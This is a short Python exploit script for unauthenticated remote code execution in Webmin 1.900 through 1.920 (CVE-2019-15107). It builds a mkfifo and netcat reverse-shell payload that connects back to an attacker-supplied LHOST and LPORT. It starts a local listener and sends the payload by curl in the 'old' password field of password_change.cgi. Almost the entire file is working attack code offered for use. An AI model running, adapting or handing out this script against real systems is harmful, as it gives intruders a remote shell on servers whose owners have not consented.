##########################################################################
#   Exploit for Webmin server versions from 1.900 through 1.920          #
#                                                                        #
#   CVE: 2019-15107         Unauthenticated Remote Code Execution        #
#                                                                        #
#   Author: @hsilyav                                   			 #
#                                                                        #
##########################################################################

import argparse
import re
import urllib.parse
import subprocess

def is_valid_ip(ip):
    ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
    return re.match(ip_pattern, ip) is not None

def is_valid_port(port):
    return 1 <= port <= 65535

def main():
    parser = argparse.ArgumentParser(description="Exploit Webmin 1.920 - Unauthenticated Remote Code Execution.")
    
    parser.add_argument("target_host", help="Target IP or domain")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("LHOST", help="Your IP address (LHOST)")
    parser.add_argument("LPORT", type=int, help="Your local listening port (LPORT)")

    args = parser.parse_args()

    if not (is_valid_ip(args.target_host) or re.match(r"^[a-zA-Z0-9.-]+$", args.target_host)):
        print("The target_host must be a valid IP address or domain.")
        return

    if not is_valid_port(args.target_port):
        print("The target_port is not in the valid range (1-65535).")
        return

    if not is_valid_ip(args.LHOST):
        print("LHOST must be a valid IP address.")
        return

    if not is_valid_port(args.LPORT):
        print("LPORT is not in the valid range (1-65535).")
        return
    
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {args.LHOST} {args.LPORT} >/tmp/f"
    encoded_payload = urllib.parse.quote_plus(payload, safe="|>/")
        
    netcat_process = subprocess.Popen(["nc", "-l", "-p", str(args.LPORT)])
    print('\n','[*] Listening on port',args.LPORT)
        
    print('\n','[*] Sending payload: ',encoded_payload)
    print('\n')
    
    curl_command = (
        f"curl -X POST http://{args.target_host}:{args.target_port}/password_change.cgi "
        f"-H 'Host: {args.target_host}:{args.target_port}' "
        f"-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' "
        f"-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' "
        f"-H 'Accept-Language: en-US,en;q=0.5' "
        f"-H 'Accept-Encoding: gzip, deflate, br' "
	f"-H 'Referer: http://{args.target_host}:{args.target_port}/session_login.cgi' "
        f"-H 'Content-Type: application/x-www-form-urlencoded' "
        f"-H 'Content-Length: 139' "
        f"-H 'Origin: http://{args.target_host}:{args.target_port}' "
        f"-H 'Connection: close' "
        f"-H 'Cookie: redirect=1; testing=1; sessiontest=1' "
	f"-H 'Upgrade-Insecure-Requests: 1' "
        f"-d 'user=Test&pam=&expired=2&old={encoded_payload}&new1=test&new2=test' "
    )
    
    subprocess.run(curl_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    print('\n\n',"[*] Exploit completed.")

if __name__ == "__main__":
    main()
